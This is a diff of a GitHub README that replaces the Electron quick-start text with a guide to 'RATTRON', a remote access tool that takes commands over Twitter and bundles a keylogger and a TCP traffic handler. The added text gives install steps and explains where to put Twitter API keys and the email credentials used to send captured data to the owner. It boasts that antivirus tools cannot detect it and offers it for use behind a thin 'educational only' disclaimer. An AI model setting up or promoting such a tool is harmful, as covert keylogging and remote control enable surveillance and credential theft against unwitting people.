@@ -1,45 +1,45 @@
-# electron-quick-start
+# RATTRON
 
-**Clone and run for a quick way to see Electron in action.**
+RATTRON is a simple example of remote access tool that use twitter as command server. Including keylogger and tcp packets handler.
 
-This is a minimal Electron application based on the [Quick Start Guide](https://electronjs.org/docs/tutorial/quick-start) within the Electron documentation.
+##### I am not responsible for how you will use this application. This app is for educational only.
+----------
+##### How to install
 
-**Use this app along with the [Electron API Demos](https://electronjs.org/#get-started) app for API code examples to help you get started.**
+  ```sh
+  git clone https://github.com/bychok300/rattron
+  cd rattron
+  npm install
+  ```
 
-A basic Electron application needs just these files:
-
-- `package.json` - Points to the app's main file and lists its details and dependencies.
-- `main.js` - Starts the app and creates a browser window to render HTML. This is the app's **main process**.
-- `index.html` - A web page to render. This is the app's **renderer process**.
-
-You can learn more about each of these components within the [Quick Start Guide](https://electronjs.org/docs/tutorial/quick-start).
-
-## To Use
-
-To clone and run this repository you'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [npm](http://npmjs.com)) installed on your computer. From your command line:
-
-```bash
-# Clone this repository
-git clone https://github.com/electron/electron-quick-start
-# Go into the repository
-cd electron-quick-start
-# Install dependencies
-npm install
-# Run the app
+#### Quick tutorial
+```js
+    //open main.js file
+    //it contains rat functionality
+    //pass your keys to get twitter access
+    let client = new Twitter({
+        consumer_key: 'YOUR_KEY',
+        consumer_secret: 'YOUR_KEY',
+        access_token_key: 'YOUR_KEY',
+        access_token_secret: 'YOUR_KEY'
+    });
+```
+After you need pass email credentials in `sendMailToOwner` function.
+Finally you can run app using
+```sh
 npm start
 ```
+-----------
 
-Note: If you're using Linux Bash for Windows, [see this guide](https://www.howtogeek.com/261575/how-to-run-graphical-linux-desktop-applications-from-windows-10s-bash-shell/) or use `node` from the command prompt.
+for executed file for all platforms see [electron packager](https://github.com/electron-userland/electron-packager)
+#### Keylogger and TCP handler
 
-## Resources for Learning Electron
+`rattron/Utils/loggerNtcpHandler.js` contains all function to handle tcp traffic and key press events.
+If you want use it just copy this code and replace code in main.js
 
-- [electronjs.org/docs](https://electronjs.org/docs) - all of Electron's documentation
-- [electronjs.org/community#boilerplates](https://electronjs.org/community#boilerplates) - sample starter apps created by the community
-- [electron/electron-quick-start](https://github.com/electron/electron-quick-start) - a very basic starter Electron app
-- [electron/simple-samples](https://github.com/electron/simple-samples) - small applications with ideas for taking them further
-- [electron/electron-api-demos](https://github.com/electron/electron-api-demos) - an Electron app that teaches you how to use Electron
-- [hokein/electron-sample-apps](https://github.com/hokein/electron-sample-apps) - small demo apps for the various Electron APIs
+#### notice that loggerNtcpHandler.js does't contains functions for sending created files to attacker
 
-## License
+this is it :^) Virus total test doesn't recognize any malware or trojan or somthing bad. It tool fully unvisible for antivirus
+feel free to ask your quiestions, create pull requests, and do whatever you want)
 
-[CC0 1.0 (Public Domain)](LICENSE.md)
+if you like this app you may donate me. bitcoin: 17jJDW8z9KVsueY4P7g33jrJhZbD9GxsBY
